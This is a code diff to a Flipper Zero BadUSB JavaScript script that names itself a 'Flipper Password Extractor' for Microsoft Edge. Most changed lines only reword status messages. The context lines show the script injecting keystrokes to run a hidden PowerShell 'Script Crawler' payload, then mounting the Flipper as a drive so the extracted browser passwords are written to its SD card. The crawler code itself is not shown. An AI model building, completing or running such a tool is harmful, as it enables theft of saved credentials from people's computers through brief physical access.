@@ -27,6 +27,9 @@ let command = "";
 for (let i = 0; i < script.length; i++) {
     command += script[i];
 }
+print("--- Flipper Password Extractor ---");
+print("(i) You are running the Microsoft Edge version");
+print("(i) The passwords will be stored inside the Flipper's SD Card");
 
 // Check if mass storage already exists
 print("Checking for Image...");
@@ -60,7 +63,7 @@ delay(500);
 badusb.press("ENTER");
 delay(2000);
 
-print("Running payload");
+print("Running payload...");
 badusb.println(command, 1);//Run Script Crawler
 delay(9000)
 
@@ -68,7 +71,8 @@ badusb.println("Start-Sleep 8; $DriveLetter = Get-Disk -FriendlyName 'Flipper Ma
 badusb.quit();
 delay(2000);
 usbdisk.start(image);//Open MassStorage Folder
-print("Please wait until powershell closes to eject");
+print("Writing to the Flipper...");
+print("/!\\ DO NOT DISCONNECT /!\\");
 
 // Wait for user to eject the mass storage
 while (!usbdisk.wasEjected()) {
@@ -77,6 +81,6 @@ while (!usbdisk.wasEjected()) {
 
 // Stop the script
 usbdisk.stop();
-print("Done");
+print("Done. You can now disconnect the Flipper.");
 
 
